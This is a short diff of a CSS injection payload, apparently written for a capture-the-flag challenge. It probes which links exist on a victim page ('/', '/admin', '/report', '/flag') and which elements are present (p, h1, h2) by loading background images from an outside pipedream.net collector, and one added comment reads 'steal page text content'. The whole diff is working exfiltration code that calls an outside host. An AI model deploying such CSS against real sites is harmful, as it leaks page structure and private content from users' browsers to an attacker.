@@ -1,7 +1,10 @@
-/* v3 */
+/* v4 */
 a[href="/"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/href-root') }
-a[href="/admin"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/href-admin') }
 a[href="/report"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/href-report') }
 a[href="/flag"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/href-flag') }
-a[href="/dashboard"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/href-dashboard') }
-a[href="/secret"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/href-secret') }
+a[href="/admin"] { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/href-admin') }
+
+/* 偷取頁面文字內容 */
+p:first-of-type { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/has-p') }
+h1 { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/has-h1') }
+h2 { background: url('https://eonx1tvsx1uwahp.m.pipedream.net/has-h2') }
